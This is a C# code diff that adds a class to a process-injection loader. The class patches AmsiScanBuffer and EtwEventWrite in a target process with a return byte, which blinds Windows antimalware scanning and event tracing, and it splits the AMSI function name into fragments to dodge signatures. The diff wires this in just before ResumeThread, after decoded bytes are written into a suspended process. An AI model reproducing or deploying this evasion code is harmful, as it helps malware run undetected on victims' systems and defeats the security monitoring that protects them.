@@ -8,6 +8,94 @@ using Microsoft.VisualBasic.Devices;
 
 namespace ConsoleApp1
 {
+	
+	public class PatchAMSIAndETW
+	{
+		public enum Protection : uint
+    {
+        PAGE_NOACCESS = 0x01,
+        PAGE_READONLY = 0x02,
+        PAGE_READWRITE = 0x04,
+        PAGE_WRITECOPY = 0x08,
+        PAGE_EXECUTE = 0x10,
+        PAGE_EXECUTE_READ = 0x20,
+        PAGE_EXECUTE_READWRITE = 0x40,
+        PAGE_EXECUTE_WRITECOPY = 0x80,
+        PAGE_GUARD = 0x100,
+        PAGE_NOCACHE = 0x200,
+        PAGE_WRITECOMBINE = 0x400
+    }
+
+    public enum ProcessAccessFlags : uint
+    {
+        Terminate = 0x00000001,
+        CreateThread = 0x00000002,
+        VMOperation = 0x00000008,
+        VMRead = 0x00000010,
+        VMWrite = 0x00000020,
+        DupHandle = 0x00000040,
+        SetInformation = 0x00000200,
+        QueryInformation = 0x00000400,
+        Synchronize = 0x00100000,
+        All = 0x001F0FFF
+    }
+		
+		// https://github.com/claissg/remote_amsi_bypass/blob/master/remote_process_amsi_bypass.cs
+		
+		[DllImport("kernel32.dll")]
+    public static extern IntPtr LoadLibrary(string ddltoLoad);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
+
+    [DllImport("kernel32.dll")]
+    internal static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    internal static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+		private static void PatchETW(IntPtr hProcess)
+		{
+			try 
+			{
+				var patch = new byte[] { 0xc3 };
+        var address = GetProcAddress(LoadLibrary("ntdll.dll"), "EtwEventWrite");
+
+        VirtualProtectEx(hProcess, address, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
+        WriteProcessMemory(hProcess, address, patch, patch.Length, out IntPtr bytesWritten);
+        VirtualProtectEx(hProcess, address, (UIntPtr)patch.Length, oldProtect, out uint x);
+			}catch (Exception e)
+			{
+				Console.WriteLine(" [!] {0}", e.Message);
+				Console.WriteLine(" [!] {0}", e.InnerException);
+			}
+		}
+
+    private static void PatchAMSI(IntPtr hProcess)
+		{
+        try {
+						var patch = new byte[] { 0xc3 };
+		        var address = GetProcAddress(LoadLibrary("ams" + "i.dll"), "Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er");
+
+		        VirtualProtectEx(hProcess, address, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
+		        WriteProcessMemory(hProcess, address, patch, patch.Length, out IntPtr bytesWritten);
+		        VirtualProtectEx(hProcess, address, (UIntPtr)patch.Length, oldProtect, out uint x);
+        }catch (Exception e)
+				{
+            Console.WriteLine(" [!] {0}", e.Message);
+            Console.WriteLine(" [!] {0}", e.InnerException);
+        }
+    }
+			
+		[System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
+    [System.Security.SecurityCritical]
+    public static void Mein(IntPtr hProcess)
+		{
+        PatchAMSI(hProcess);
+        PatchETW(hProcess);
+    }
+	}
+	
 	class Program
 	{
 
@@ -65,7 +153,7 @@ namespace ConsoleApp1
 
 		[DllImport("kernel32.dll")]
 		static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-		
+
 		[DllImport("kernel32.dll", SetLastError = true)]
 		private static extern uint ResumeThread(IntPtr hThread);
 
@@ -115,6 +203,8 @@ namespace ConsoleApp1
 				baite[0] = (byte)(((uint)baite[0] - key) & 0xFF);
 				WriteProcessMemory(hProcess, ptr, baite, 1, out nRead);
 			}
+			
+			PatchAMSIAndETW.Mein(hProcess);
 
 			ResumeThread(pi.hThread);
 		}
